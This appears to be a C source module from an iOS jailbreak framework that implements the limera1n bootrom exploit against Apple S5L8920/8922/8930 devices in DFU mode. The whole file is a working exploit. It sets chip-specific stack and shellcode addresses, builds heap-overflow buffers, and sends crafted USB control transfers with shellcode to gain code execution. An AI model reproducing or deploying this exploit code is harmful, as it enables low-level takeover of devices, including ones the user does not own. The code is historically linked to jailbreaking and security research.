/*
 * limera1n code.
 */

#include "core.h"

#include "payload.h"

DECLARE_MODULE(
	"limera1n/limera1n",
	MODULE_UNLOAD_CAPABILITY_OK,
	_modinit,
	_moddeinit,
	"1.0.0",
	"neko2k <neko2k@beige-box.com>"
	);


int limera1n(void)
{
	irecv_error_t error = IRECV_E_SUCCESS;
	unsigned int i = 0;
	unsigned char buf[0x800];
	unsigned char shellcode[0x800];
	unsigned int max_size = 0x24000;
	unsigned int stack_address = 0x84033F98;
	unsigned int shellcode_address = 0x84023001;

	if (device->chip_id == 8930) {
		max_size = 0x2C000;
		stack_address = 0x8403BF9C;
		shellcode_address = 0x8402B001;
	}
	if (device->chip_id == 8920) {
		max_size = 0x24000;
		stack_address = 0x84033FA4;
		shellcode_address = 0x84023001;
	}

	memset(shellcode, 0x0, 0x800);
	memcpy(shellcode, Payload, sizeof(Payload));


	DPRINT("Resetting device counters\n");
	error = irecv_reset_counters(client);
	if (error != IRECV_E_SUCCESS) {
		DPRINT("%s\n", irecv_strerror(error));
		return -1;
	}

	memset(buf, 0xCC, 0x800);
	for (i = 0; i < 0x800; i += 0x40) {
		unsigned int *heap = (unsigned int *)(buf + i);
		heap[0] = 0x405;
		heap[1] = 0x101;
		heap[2] = shellcode_address;
		heap[3] = stack_address;
	}

	DPRINT("Sending chunk headers\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);

	memset(buf, 0xCC, 0x800);
	for (i = 0; i < (max_size - (0x800 * 3)); i += 0x800) {
		irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 1000);
	}

	DPRINT("Sending exploit payload\n");
	irecv_control_transfer(client, 0x21, 1, 0, 0, shellcode, 0x800, 1000);

	DPRINT("Sending fake data\n");
	memset(buf, 0xBB, 0x800);
	irecv_control_transfer(client, 0xA1, 1, 0, 0, buf, 0x800, 1000);
	irecv_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);

	DPRINT("Executing exploit\n");
	irecv_control_transfer(client, 0x21, 2, 0, 0, buf, 0, 1000);
	irecv_reset(client);
	irecv_finish_transfer(client);

	DPRINT("Exploit sent\n");

	DPRINT("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		DPRINT("%s\n", irecv_strerror(error));
		DPRINT("Unable to reconnect\n");
		return -1;
	}
	return 0;
}

void _modinit(module_t *m) {
	exploit_add_handler(limera1n, S5L8930, kDFU);
	exploit_add_handler(limera1n, S5L8922, kDFU);
	exploit_add_handler(limera1n, S5L8920, kDFU);
}

void _moddeinit(module_unload_intent_t intent) {
	return;
}
